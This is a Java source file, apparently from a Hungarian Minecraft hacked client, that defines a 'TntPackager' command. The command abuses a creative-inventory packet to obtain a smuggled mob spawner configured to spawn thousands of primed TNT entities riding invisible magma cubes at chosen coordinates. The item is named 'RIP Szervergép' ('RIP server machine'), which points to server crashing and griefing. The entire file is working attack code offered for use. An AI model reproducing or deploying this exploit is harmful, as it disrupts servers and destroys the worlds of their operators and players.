package DTool.command.impl;

import DTool.command.*;
import net.minecraft.item.*;
import net.minecraft.init.*;
import net.minecraft.nbt.*;
import net.minecraft.client.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import Mood.*;

public class TntPackager extends Command
{
    public TntPackager() {
        super("TntPackager", "TntPackager", "TntPackager", new String[] { "TntPackager" });
    }
    
    public static ItemStack getSpawnerFromDispenser(final ItemStack itemStack) {
        final ItemStack itemStack2 = new ItemStack(Blocks.dispenser);
        final NBTTagCompound tagCompound = new NBTTagCompound();
        final NBTTagCompound nbtTagCompound = new NBTTagCompound();
        nbtTagCompound.setShort("BurnTime", (short)0);
        nbtTagCompound.setShort("CookTime", (short)0);
        nbtTagCompound.setShort("CookTimeTotal", (short)200);
        nbtTagCompound.setString("id", "Furnace");
        nbtTagCompound.setString("Lock", "");
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound nbtTagCompound2 = new NBTTagCompound();
        nbtTagCompound2.setByte("Count", (byte)1);
        nbtTagCompound2.setShort("Damage", (short)itemStack.getItemDamage());
        nbtTagCompound2.setString("id", "minecraft:mob_spawner");
        nbtTagCompound2.setShort("Slot", (short)0);
        nbtTagCompound2.setTag("tag", itemStack.getTagCompound());
        list.appendTag(nbtTagCompound2);
        nbtTagCompound.setTag("Items", list);
        tagCompound.setTag("BlockEntityTag", nbtTagCompound);
        itemStack2.setTagCompound(tagCompound);
        return itemStack2;
    }
    
    public static ItemStack getTntPackager(final double n, final double n2, final double n3) {
        final ItemStack itemStack = new ItemStack(Blocks.mob_spawner, 1, 0);
        final NBTTagCompound tagCompound = new NBTTagCompound();
        final NBTTagCompound nbtTagCompound = new NBTTagCompound();
        nbtTagCompound.setString("EntityId", "PrimedTnt");
        nbtTagCompound.setString("CustomName", "§4§lRIP Szerverg\u00e9p");
        nbtTagCompound.setInteger("SpawnCount", 5000);
        nbtTagCompound.setInteger("CustomNameVisible", 1);
        nbtTagCompound.setInteger("SpawnRange", 10);
        nbtTagCompound.setInteger("RequiredPlayerRange", 5000);
        nbtTagCompound.setInteger("MinSpawnDelay", 60);
        nbtTagCompound.setInteger("Delay", 20);
        nbtTagCompound.setInteger("MaxSpawnDelay", 120);
        nbtTagCompound.setInteger("MaxNearbyEntities", 5000);
        final NBTTagCompound nbtTagCompound2 = new NBTTagCompound();
        final NBTTagCompound nbtTagCompound3 = new NBTTagCompound();
        final NBTTagList list = new NBTTagList();
        list.appendTag(new NBTTagDouble(n));
        list.appendTag(new NBTTagDouble(n2));
        list.appendTag(new NBTTagDouble(n3));
        nbtTagCompound3.setString("id", "LavaSlime");
        nbtTagCompound2.setTag("Pos", list);
        final NBTTagCompound nbtTagCompound4 = new NBTTagCompound();
        nbtTagCompound4.setInteger("id", 14);
        nbtTagCompound4.setInteger("Amplifier", 0);
        nbtTagCompound4.setInteger("Duration", 2000000);
        nbtTagCompound4.setByte("ShowParticles", (byte)0);
        final NBTTagList list2 = new NBTTagList();
        list2.appendTag(nbtTagCompound4);
        nbtTagCompound3.setTag("ActiveEffects", list2);
        nbtTagCompound2.setTag("Riding", nbtTagCompound3);
        nbtTagCompound.setTag("SpawnData", nbtTagCompound2);
        tagCompound.setTag("BlockEntityTag", nbtTagCompound);
        itemStack.setTagCompound(tagCompound);
        return itemStack;
    }
    
    @Override
    public void onCommand(final String[] array, final String s) {
        if (array.length <= 3) {
            final Minecraft mc = TntPackager.mc;
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, getSpawnerFromDispenser(getTntPackager(Double.valueOf(array[0]), Double.valueOf(array[1]), Double.valueOf(array[2])))));
            Segito.msg("Az§e Item§7 sikeresen le lett k\u00e9rve!");
            Segito.msg("Az Entit\u00e1sok mostant\u00f3l enn\u00e9l a pontn\u00e1l");
            Segito.msg("fognak megjelenni.");
        }
    }
}
